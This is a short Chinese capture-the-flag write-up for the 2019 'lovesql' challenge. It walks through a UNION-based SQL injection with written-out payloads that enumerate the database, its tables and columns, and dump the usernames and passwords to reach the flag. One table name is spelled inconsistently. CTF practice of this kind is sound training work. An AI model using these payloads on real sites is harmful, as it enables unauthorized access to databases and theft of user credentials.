【极客大挑战2019】——lovesql

（做完发现和less-1很像，都用了联合查询）
先用万能公式

无果 找回显位置

使用union联合查询，一直到第三位数才显示登录成功，说明列表数为3

可以通过修改，确认2，3为回显位置

使用1’union 1,2,database()
爆出当前数据库名——geek

输入：
1’ union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1#
爆出表一名：geekuser

1’ union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1#
爆出表二名：I0veysq1
知道表二名，与题目名lovesql相符，查找列名

1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’l0ve1ysq1’ #
爆出列名：id,username,password

1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1#

爆出 flag
